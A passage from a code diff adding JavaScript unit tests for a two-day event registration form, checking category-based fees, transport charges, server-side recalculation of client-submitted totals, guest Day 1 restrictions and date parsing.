+    attendance: ["Day 1"],
+    transport: "Ramses Square",
+    pickupLocation: ""
+  };
+
+  assert.equal(guestSubmission.transport, "Ramses Square");
+
+  const html = generateRegistrationEmailHtml(guestSubmission);
+  assert.ok(html.includes("Ramses Square (Complimentary)"));
+  assert.ok(html.includes("0 EGP (Complimentary)"));
+  assert.ok(html.includes("0 EGP (Free Registration)"));
+  assert.ok(!html.includes("payment records"));
+  assert.ok(!html.includes("payment verification"));
+});
+
+test("POLICY & SECURITY: Client-submitted nonzero transport fee or total fee is completely overridden", () => {
+  // Point 4: Client-submitted nonzero transport fee is not trusted
+  // Point 5: Client-submitted nonzero total cannot override server calculation
+  function serverFeeRecalculate(data) {
+    const status = String(data.status || "").trim();
+    const isGuest = status === "Distinguished Guest / Professional";
+    const isGraduate = status === "Graduate" || status === "Graduate / Alumni";
+    const isStudent = status === "Student";
+
+    const attendanceList = Array.isArray(data.attendance)
+      ? data.attendance
+      : (data.attendance ? [data.attendance] : []);
+
+    const hasDay1 = attendanceList.some(function(d) {
+      const s = String(d).toLowerCase().trim();
+      return s === "day 1" || s === "1" || s.indexOf("day 1") !== -1 || s.indexOf("nov 12") !== -1 || s.indexOf("november 12") !== -1 || s === "12";
+    });
+    const hasDay2 = attendanceList.some(function(d) {
+      const s = String(d).toLowerCase().trim();
+      return s === "day 2" || s === "2" || s.indexOf("day 2") !== -1 || s.indexOf("nov 14") !== -1 || s.indexOf("november 14") !== -1 || s === "14";
+    });
+
+    if (isGuest && hasDay2) {
+      throw new Error("Distinguished Guest / Professional registration is restricted to Day 1 only.");
+    }
+
+    let calculatedBaseFee = 0;
+    if (isGuest) {
+      calculatedBaseFee = 0;
+    } else if (isStudent) {
+      calculatedBaseFee = 200;
+    } else if (isGraduate) {
+      calculatedBaseFee = hasDay2 ? 200 : 0;
+    } else {
+      calculatedBaseFee = 200;
+    }
+
+    const transport = data.transport || "No transport";
+    const hasTransport = transport && transport !== "No transport";
+    const calculatedTransportFee = (isGuest ? 0 : (hasTransport ? 100 : 0));
+    const calculatedTotalFee = calculatedBaseFee + calculatedTransportFee;
+
+    return {
+      baseFee: calculatedBaseFee,
+      transportFee: calculatedTransportFee,
+      totalFee: calculatedTotalFee
+    };
+  }
+
+  // Guest submitting fake transportFee of 100 and fake totalFee of 100
+  const guestTampered = serverFeeRecalculate({
+    status: "Distinguished Guest / Professional",
+    attendance: ["Day 1"],
+    transport: "Ramses Square",
+    transportFee: 100, // untrusted
+    totalFee: 100      // untrusted
+  });
+  assert.equal(guestTampered.transportFee, 0);
+  assert.equal(guestTampered.totalFee, 0);
+
+  // Student submitting fake totalFee of 0
+  const studentTampered = serverFeeRecalculate({
+    status: "Student",
+    attendance: ["Day 1"],
+    transport: "No transport",
+    totalFee: 0 // untrusted
+  });
+  assert.equal(studentTampered.baseFee, 200);
+  assert.equal(studentTampered.totalFee, 200);
+});
+
+test("POLICY: Server rejects Day 2 or both days for Distinguished Guest / Professional", () => {
+  function validateAttendanceForCategory(category, attendance) {
+    const isGuest = category === "Distinguished Guest / Professional";
+    const days = Array.isArray(attendance) ? attendance : [attendance];
+    const hasDay1 = days.some(d => {
+      const s = String(d).toLowerCase().trim();
+      return s === "day 1" || s === "1" || s.includes("day 1") || s.includes("nov 12") || s.includes("november 12") || s === "12";
+    });
+    const hasDay2 = days.some(d => {
+      const s = String(d).toLowerCase().trim();
+      return s === "day 2" || s === "2" || s.includes("day 2") || s.includes("nov 14") || s.includes("november 14") || s === "14";
+    });
+
+    if (isGuest && hasDay2) {
+      return "Distinguished Guest / Professional registration is restricted to Day 1 only.";
+    }
+    if (!isGuest && !hasDay1 && !hasDay2) {
+      return "Please select at least one attendance day.";
+    }
+    return "";
+  }
+
+  // Point 6: Day 1 is accepted
+  assert.equal(validateAttendanceForCategory("Distinguished Guest / Professional", ["Day 1"]), "");
+  assert.equal(validateAttendanceForCategory("Distinguished Guest / Professional", ["November 12, 2026"]), "");
+
+  // Point 7: Day 2 is rejected
+  assert.equal(
+    validateAttendanceForCategory("Distinguished Guest / Professional", ["Day 2"]),
+    "Distinguished Guest / Professional registration is restricted to Day 1 only."
+  );
+  assert.equal(
+    validateAttendanceForCategory("Distinguished Guest / Professional", ["November 14, 2026"]),
+    "Distinguished Guest / Professional registration is restricted to Day 1 only."
+  );
+
+  // Point 8: Both days is rejected
+  assert.equal(
+    validateAttendanceForCategory("Distinguished Guest / Professional", ["Day 1", "Day 2"]),
+    "Distinguished Guest / Professional registration is restricted to Day 1 only."
+  );
+  assert.equal(
+    validateAttendanceForCategory("Distinguished Guest / Professional", ["November 12, 2026", "November 14, 2026"]),
+    "Distinguished Guest / Professional registration is restricted to Day 1 only."
+  );
+});
+
+test("POLICY: Payment and refund fields are not required for Distinguished Guest / Professional", () => {
+  // Point 9: Payment & refund fields are optional/not required
+  function isPaymentRequired(category, totalFee) {
+    const isGuest = category === "Distinguished Guest / Professional";
+    const isFree = totalFee === 0 || totalFee === "0" || totalFee === "0 EGP";
+    return !(isGuest || isFree);
+  }
+
+  assert.equal(isPaymentRequired("Distinguished Guest / Professional", 0), false);
+  assert.equal(isPaymentRequired("Distinguished Guest / Professional", "0 EGP"), false);
+  assert.equal(isPaymentRequired("Student", 200), true);
+  assert.equal(isPaymentRequired("Student", 300), true);
+});
+
+test("POLICY: Category switching correctly recalculates fees and does not retain stale transportation fee", () => {
+  // Point 10: Switching categories recalculation sequence
+  // 1. User starts as Student and selects Ramses Square (+100 EGP)
+  const step1 = calculateFee({ category: "Student", attendance: ["Day 1"], transport: "Ramses Square" });
+  assert.deepEqual(step1, { baseFee: 200, transportFee: 100, totalFee: 300 });
+
+  // 2. User switches to Distinguished Guest / Professional (transport choice preserved)
+  const step2 = calculateFee({ category: "Distinguished Guest / Professional", attendance: ["Day 1"], transport: "Ramses Square" });
+  assert.deepEqual(step2, { baseFee: 0, transportFee: 0, totalFee: 0 });
+
+  // 3. User switches back to Student (transport choice still selected)
+  const step3 = calculateFee({ category: "Student", attendance: ["Day 1"], transport: "Ramses Square" });
+  assert.deepEqual(step3, { baseFee: 200, transportFee: 100, totalFee: 300 });
+
+  // 4. User switches to Graduate Day 1 (Day 1 free, transport +100 EGP)
+  const step4 = calculateFee({ category: "Graduate / Alumni", attendance: ["Day 1"], transport: "Ramses Square" });
+  assert.deepEqual(step4, { baseFee: 0, transportFee: 100, totalFee: 100 });
+
+  // 5. User switches back to Distinguished Guest
+  const step5 = calculateFee({ category: "Distinguished Guest / Professional", attendance: ["Day 1"], transport: "Ramses Square" });
+  assert.deepEqual(step5, { baseFee: 0, transportFee: 0, totalFee: 0 });
+});
+
+test("POLICY: Existing Student and Graduate / Alumni fee policies remain strictly unchanged", () => {
+  // Point 11: Student fees (always 200 base, +100 transport)
+  assert.deepEqual(calculateFee({ category: "Student", attendance: ["Day 1"], transport: "No transport" }), { baseFee: 200, transportFee: 0, totalFee: 200 });
+  assert.deepEqual(calculateFee({ category: "Student", attendance: ["Day 1"], transport: "Ramses Square" }), { baseFee: 200, transportFee: 100, totalFee: 300 });
+  assert.deepEqual(calculateFee({ category: "Student", attendance: ["Day 2"], transport: "No transport" }), { baseFee: 200, transportFee: 0, totalFee: 200 });
+  assert.deepEqual(calculateFee({ category: "Student", attendance: ["Day 2"], transport: "Other location" }), { baseFee: 200, transportFee: 100, totalFee: 300 });
+  assert.deepEqual(calculateFee({ category: "Student", attendance: ["Day 1", "Day 2"], transport: "No transport" }), { baseFee: 200, transportFee: 0, totalFee: 200 });
+  assert.deepEqual(calculateFee({ category: "Student", attendance: ["Day 1", "Day 2"], transport: "Ramses Square" }), { baseFee: 200, transportFee: 100, totalFee: 300 });
+
+  // Point 12: Graduate / Alumni fees
+  // Day 1 only: free base, +100 transport
+  assert.deepEqual(calculateFee({ category: "Graduate / Alumni", attendance: ["Day 1"], transport: "No transport" }), { baseFee: 0, transportFee: 0, totalFee: 0 });
+  assert.deepEqual(calculateFee({ category: "Graduate / Alumni", attendance: ["Day 1"], transport: "Ramses Square" }), { baseFee: 0, transportFee: 100, totalFee: 100 });
+  // Day 2 only: 200 base, +100 transport
+  assert.deepEqual(calculateFee({ category: "Graduate / Alumni", attendance: ["Day 2"], transport: "No transport" }), { baseFee: 200, transportFee: 0, totalFee: 200 });
+  assert.deepEqual(calculateFee({ category: "Graduate / Alumni", attendance: ["Day 2"], transport: "Ramses Square" }), { baseFee: 200, transportFee: 100, totalFee: 300 });
+  // Both days: 200 base, +100 transport
+  assert.deepEqual(calculateFee({ category: "Graduate / Alumni", attendance: ["Day 1", "Day 2"], transport: "No transport" }), { baseFee: 200, transportFee: 0, totalFee: 200 });
+  assert.deepEqual(calculateFee({ category: "Graduate / Alumni", attendance: ["Day 1", "Day 2"], transport: "Ramses Square" }), { baseFee: 200, transportFee: 100, totalFee: 300 });
+});
+
+test("POLICY: Date parsing distinguishes November 12, 2026, from Day 2 with absolute precision", () => {
+  // Point 13: Date parsing precision
+  const day1Strings = [
+    "November 12, 2026",
+    "November 12",
+    "Nov 12",
+    "Day 1",
+    "12"
+  ];
+
+  for (const str of day1Strings) {
+    const gradFee = calculateFee({ category: "Graduate / Alumni", attendance: [str], transport: "No transport" });
+    assert.equal(gradFee.baseFee, 0, `False positive Day 2 trigger for string: ${str}`);
+    assert.equal(gradFee.totalFee, 0, `False positive Day 2 trigger for string: ${str}`);
+
+    const guestFee = calculateFee({ category: "Distinguished Guest / Professional", attendance: [str], transport: "Ramses Square" });
+    assert.equal(guestFee.baseFee, 0);
+    assert.equal(guestFee.transportFee, 0);
+    assert.equal(guestFee.totalFee, 0);
+  }
 });
